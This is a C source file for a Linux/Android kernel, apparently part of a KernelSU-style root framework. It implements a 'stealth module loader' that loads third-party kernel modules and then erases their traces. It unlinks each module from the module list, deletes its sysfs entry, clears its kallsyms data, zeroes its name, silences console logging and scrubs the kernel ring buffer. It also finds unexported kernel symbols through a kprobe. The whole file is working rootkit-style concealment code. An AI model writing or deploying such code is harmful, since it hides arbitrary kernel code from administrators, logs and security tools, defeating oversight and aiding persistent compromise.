/*
 * stealth_modloader.c - Stealth kernel module loading framework
 *
 * Provides infrastructure to load third-party kernel modules with complete
 * trace elimination. After loading, the module is invisible in:
 * - /proc/modules (lsmod)
 * - /sys/module/<name>/
 * - /proc/kallsyms
 * - dmesg / kernel log
 *
 * Also maintains a "stealth module registry" that other filter modules
 * (proc_hide, klog_sanitize, etc.) query to dynamically extend their
 * filter rules based on which modules are currently stealth-loaded.
 *
 * Usage:
 *   1. Userspace calls supercall STEALTH_LOAD_MODULE(path)
 *   2. Or: after manual insmod, call STEALTH_REGISTER_MODULE(name)
 */

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <linux/kobject.h>
#include <linux/version.h>
#include <linux/atomic.h>
#include <linux/umh.h>
#include <linux/limits.h>
#include <linux/namei.h>

#include "klog.h" // IWYU pragma: keep

/* ---- Stealth Module Registry ---- */

#define MAX_STEALTH_MODULES 32
#define MAX_PREFIXES_PER_MODULE 8
#define MAX_PREFIX_LEN 64
#define MAX_MODULE_NAME_LEN 64

struct stealth_module_entry {
	char name[MAX_MODULE_NAME_LEN];
	char prefixes[MAX_PREFIXES_PER_MODULE][MAX_PREFIX_LEN];
	int prefix_count;
	struct module *mod; /* NULL if unloaded or not tracked */
	bool active;
};

static struct stealth_module_entry registry[MAX_STEALTH_MODULES];
static DEFINE_MUTEX(registry_lock);
static int registry_count;

/*
 * Flat prefix array for fast iteration by filter modules.
 * Rebuilt whenever registry changes. NULL-terminated.
 */
static const char *prefix_cache[MAX_STEALTH_MODULES * MAX_PREFIXES_PER_MODULE + 1];
static atomic_t prefix_cache_valid = ATOMIC_INIT(0);

static void rebuild_prefix_cache(void)
{
	int i, j, idx = 0;

	for (i = 0; i < registry_count; i++) {
		if (!registry[i].active)
			continue;
		for (j = 0; j < registry[i].prefix_count; j++) {
			if (idx < ARRAY_SIZE(prefix_cache) - 1)
				prefix_cache[idx++] = registry[i].prefixes[j];
		}
		/* Also add module name itself as a prefix */
		if (idx < ARRAY_SIZE(prefix_cache) - 1)
			prefix_cache[idx++] = registry[i].name;
	}
	prefix_cache[idx] = NULL;
	atomic_set(&prefix_cache_valid, 1);
}

/**
 * ksu_get_stealth_symbol_prefixes() - Get NULL-terminated array of stealth prefixes.
 *
 * Called by proc_hide, klog_sanitize, boot_sanitize to extend their
 * filter rules dynamically.
 *
 * Returns: pointer to static NULL-terminated array, or NULL if empty.
 * The caller must NOT free the returned pointer.
 */
const char **ksu_get_stealth_symbol_prefixes(void)
{
	if (!atomic_read(&prefix_cache_valid) || registry_count == 0)
		return NULL;
	return prefix_cache;
}

/* ---- Symbol Resolution ---- */

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kln_func;

static bool ensure_kln(void)
{
	struct kprobe kp;

	if (kln_func)
		return true;

	memset(&kp, 0, sizeof(kp));
	kp.symbol_name = "kallsyms_lookup_name";
	if (register_kprobe(&kp) < 0)
		return false;
	kln_func = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
	return kln_func != NULL;
}

static unsigned long lookup_name(const char *name)
{
	return kln_func ? kln_func(name) : 0;
}

/* ---- Module Hiding Helpers ---- */

static struct mutex *p_module_mutex;

static void resolve_module_mutex(void)
{
	unsigned long addr;

	if (p_module_mutex)
		return;
	if (!ensure_kln())
		return;
	addr = lookup_name("module_mutex");
	p_module_mutex = addr ? (struct mutex *)addr : NULL;
}

/**
 * hide_module_sysfs() - Remove sysfs/kallsyms traces from a loaded module.
 * @mod: pointer to the module struct
 *
 * After this call, the module is invisible to lsmod, /proc/modules,
 * /sys/module/<name>/, and /proc/kallsyms.
 * The module remains loaded and functional.
 *
 * NOTE: Caller MUST already hold p_module_mutex for list removal, or
 * must have already removed mod from the list. This function handles
 * sysfs/kallsyms cleanup only.
 */
static void hide_module_sysfs(struct module *mod)
{
	if (!mod)
		return;

	/* Remove sysfs entry (/sys/module/<name>/) */
	kobject_del(&mod->mkobj.kobj);

	/* Clear kallsyms so symbols don't appear in /proc/kallsyms */
	mod->kallsyms = NULL;

	/* Clear section attributes */
#if defined(CONFIG_KALLSYMS) && defined(CONFIG_SYSFS)
	mod->sect_attrs = NULL;
#endif

	/* Zero module name to prevent string matching */
	memset(mod->name, 0, sizeof(mod->name));
}

/* ---- Printk Suppression Window ---- */

static int *p_console_printk;
static int saved_loglevel = -1;

static void suppress_printk(void)
{
	unsigned long addr;

	if (!p_console_printk) {
		addr = lookup_name("console_printk");
		p_console_printk = addr ? (int *)addr : NULL;
	}

	if (p_console_printk) {
		saved_loglevel = p_console_printk[0];
		/* Set console loglevel to 0 (suppress all console output) */
		p_console_printk[0] = 0;
	}
}

static void restore_printk(void)
{
	if (p_console_printk && saved_loglevel >= 0) {
		p_console_printk[0] = saved_loglevel;
		saved_loglevel = -1;
	}
}

/* ---- Public API ---- */

#include "stealth.h"

/**
 * ksu_stealth_register_module() - Register a module in the stealth registry.
 * @name: module name (will be copied)
 * @symbol_prefixes: NULL-terminated array of symbol prefix strings to filter,
 *                   or NULL to just filter the module name itself.
 *
 * Used for:
 * 1. Post-insmod registration (module already loaded, just hide it)
 * 2. Internal use after stealth_load_module completes
 *
 * Returns 0 on success, -ENOSPC if registry is full, -EINVAL on bad args.
 */
int ksu_stealth_register_module(const char *name,
				const char **symbol_prefixes)
{
	struct stealth_module_entry *entry;
	struct module *mod;
	int i, slot = -1;

	if (!name || strlen(name) == 0)
		return -EINVAL;

	mutex_lock(&registry_lock);

	/* Check for duplicate and find first free slot */
	for (i = 0; i < registry_count; i++) {
		if (registry[i].active &&
		    strcmp(registry[i].name, name) == 0) {
			mutex_unlock(&registry_lock);
			return 0; /* Already registered */
		}
		if (!registry[i].active && slot < 0)
			slot = i; /* Reuse deactivated slot */
	}

	/* No free slot found in existing entries, try to append */
	if (slot < 0) {
		if (registry_count >= MAX_STEALTH_MODULES) {
			mutex_unlock(&registry_lock);
			return -ENOSPC;
		}
		slot = registry_count;
		registry_count++;
	}

	entry = &registry[slot];
	memset(entry, 0, sizeof(*entry));
	strscpy(entry->name, name, MAX_MODULE_NAME_LEN);
	entry->active = true;

	/* Copy symbol prefixes */
	if (symbol_prefixes) {
		for (i = 0; symbol_prefixes[i] && i < MAX_PREFIXES_PER_MODULE; i++)
			strscpy(entry->prefixes[i], symbol_prefixes[i],
				MAX_PREFIX_LEN);
		entry->prefix_count = i;
	}

	/*
	 * Find the module struct and hide it.
	 * Use the resolved p_module_mutex (via kallsyms) instead of the
	 * direct module_mutex symbol which may not be exported.
	 * Hold the lock across find + hide to prevent TOCTOU race.
	 */
	mod = NULL;
	if (p_module_mutex) {
		mutex_lock(p_module_mutex);
		mod = find_module(name);
		if (mod) {
			entry->mod = mod;
			/* Remove from modules list while holding the lock */
			list_del_init(&mod->list);
		}
		mutex_unlock(p_module_mutex);
	}

	if (mod) {
		/* Suppress printk while performing remaining hiding */
		suppress_printk();

		/* Remove sysfs + kallsyms (list already removed above) */
		hide_module_sysfs(mod);

		/* Scrub ring buffer to remove loading traces */
		ksu_boot_sanitize_scrub();

		restore_printk();
	}

	rebuild_prefix_cache();

	mutex_unlock(&registry_lock);
	return 0;
}

/**
 * ksu_stealth_unload_module() - Unregister a module from stealth registry.
 * @name: module name
 *
 * Note: This does NOT actually unload the module (that's not safely possible
 * after we removed it from the module list). It just removes the registry
 * entry so filters stop hiding its traces.
 */
int ksu_stealth_unload_module(const char *name)
{
	int i;

	if (!name)
		return -EINVAL;

	mutex_lock(&registry_lock);

	for (i = 0; i < registry_count; i++) {
		if (registry[i].active &&
		    strcmp(registry[i].name, name) == 0) {
			registry[i].active = false;
			rebuild_prefix_cache();
			mutex_unlock(&registry_lock);
			return 0;
		}
	}

	mutex_unlock(&registry_lock);
	return -ENOENT;
}

/**
 * ksu_is_stealth_module() - Check if a module name is in the stealth registry.
 */
bool ksu_is_stealth_module(const char *name)
{
	int i;
	bool found = false;

	if (!name)
		return false;

	mutex_lock(&registry_lock);
	for (i = 0; i < registry_count; i++) {
		if (registry[i].active &&
		    strcmp(registry[i].name, name) == 0) {
			found = true;
			break;
		}
	}
	mutex_unlock(&registry_lock);
	return found;
}

/**
 * ksu_stealth_load_module() - Load a kernel module with full trace hiding.
 * @path: userspace path to the .ko file
 * @params: module parameters string (or NULL)
 *
 * This is the all-in-one API:
 * 1. Suppresses printk
 * 2. Loads the module via internal kernel API
 * 3. Hides all traces
 * 4. Scrubs ring buffer
 * 5. Registers in stealth registry
 *
 * For now, module loading is done by having userspace call insmod first,
 * then calling ksu_stealth_register_module(). Direct kernel-internal
 * loading requires resolving unexported load_module() which varies
 * significantly across kernel versions.
 *
 * Returns 0 on success, negative errno on failure.
 */
int ksu_stealth_load_module(const char __user *path,
			    const char __user *params)
{
	char kpath[PATH_MAX];
	char *argv_insmod[] = { "/system/bin/insmod", kpath, NULL };
	char *argv_vendor[] = { "/vendor/bin/insmod", kpath, NULL };
	char **argv = argv_insmod;
	int ret;

	if (!path)
		return -EINVAL;

	if (strncpy_from_user(kpath, path, sizeof(kpath)) <= 0)
		return -EFAULT;
	kpath[sizeof(kpath) - 1] = '\0';

	/* Try /system/bin/insmod first, fallback to /vendor/bin/insmod */
	{
		struct path tmp;
		if (kern_path(argv_insmod[0], LOOKUP_FOLLOW, &tmp)) {
			if (kern_path(argv_vendor[0], LOOKUP_FOLLOW, &tmp))
				return -ENOENT;
			argv = argv_vendor;
		}
		path_put(&tmp);
	}

	/* Sanity check chosen insmod path */
	{
		struct path tmp;
		if (kern_path(argv[0], LOOKUP_FOLLOW, &tmp))
			return -ENOENT;
		path_put(&tmp);
	}

	suppress_printk();
	ret = call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
	restore_printk();

	if (ret)
		return ret;

	/* Derive module name from filename and hide it */
	{
		const char *base = strrchr(kpath, '/');
		const char *name = base ? base + 1 : kpath;
		char modname[MAX_MODULE_NAME_LEN];
		size_t len = strlcpy(modname, name, sizeof(modname));
		if (len > 3 && !strcmp(modname + len - 3, ".ko"))
			modname[len - 3] = '\0';
		ksu_stealth_register_module(modname, NULL);
	}

	return 0;
}

/* ---- Printk suppression control (for userspace two-step loading) ---- */

void ksu_stealth_suppress_printk_start(void)
{
	if (!ensure_kln())
		return;
	suppress_printk();
}

void ksu_stealth_suppress_printk_stop(void)
{
	restore_printk();
}

/* ---- Init/Exit ---- */

void ksu_stealth_modloader_init(void)
{
	memset(registry, 0, sizeof(registry));
	registry_count = 0;
	memset(prefix_cache, 0, sizeof(prefix_cache));

	ensure_kln();
	resolve_module_mutex();
}

void ksu_stealth_modloader_exit(void)
{
	/* Registry is static, nothing to free */
}
